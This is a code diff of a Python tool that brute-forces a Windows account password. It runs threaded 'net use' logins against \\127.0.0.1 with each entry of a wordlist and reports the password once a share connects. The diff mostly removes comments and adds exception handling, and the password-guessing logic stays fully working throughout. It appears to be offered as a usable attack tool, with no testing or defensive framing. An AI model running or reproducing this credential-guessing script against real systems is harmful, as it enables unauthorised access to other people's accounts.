@@ -26,7 +26,6 @@ def bruteforce():
         input("\nPress any key to return to the main menu...")
         return
 
-    # Read the wordlist once
     try:
         with open(wordlist, 'r') as file:
             passwords = [line.strip() for line in file]
@@ -34,38 +33,42 @@ def bruteforce():
         print(f"Error reading the wordlist file: {e}")
         return
 
-    # Use a larger number of threads to speed up the process
-    with ThreadPoolExecutor(max_workers=4) as executor:  # Increase number of threads to 4 for better speed
-        # Assign password tests to threads
+    with ThreadPoolExecutor(max_workers=4) as executor:
         futures = [executor.submit(try_password, user, pass_attempt, idx) for idx, pass_attempt in enumerate(passwords)]
 
         for future in futures:
-            # If we found the password, break out of the loop
             if future.result():
-                break  # Exit the loop when a password is found
+                break
 
     print("\nPress any key to return to the main menu...")
     input()
 
 def try_password(user, pass_attempt, idx):
     try:
-        # Try to use the password and capture stderr
         result = subprocess.run(['net', 'use', '\\\\127.0.0.1', f'/user:{user}', pass_attempt], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-        # Display attempt number and password being tested
-        if idx % 100 == 0:  # Display every 100th attempt for feedback
+        if idx % 100 == 0:
             print(f"[ATTEMPT {idx + 1}] {pass_attempt}")
         
-        # Try decoding stderr in 'ISO-8859-1' to handle non-UTF-8 characters
         stderr_output = result.stderr.decode('ISO-8859-1', errors='ignore')
 
         if "System error 1331" in stderr_output:
             return False
-        if '\\\\127.0.0.1' in subprocess.check_output('net use', shell=True, stderr=subprocess.PIPE, universal_newlines=True):
-            print(f"\n[+] Password found: {pass_attempt}")
-            return True
+        
+        try:
+            net_use_output = subprocess.check_output('net use', shell=True, stderr=subprocess.PIPE, universal_newlines=True)
+            if '\\\\127.0.0.1' in net_use_output:
+                print(f"\n[+] Password found: {pass_attempt}")
+                return True
+        except subprocess.CalledProcessError as e:
+            print(f"Error while checking net use: {e.output}")
+            return False
+
     except subprocess.CalledProcessError as e:
         print(f"Error: {e.output}")
+    except Exception as e:
+        print(f"Unexpected error: {e}")
+
     return False
 
 def main_menu():
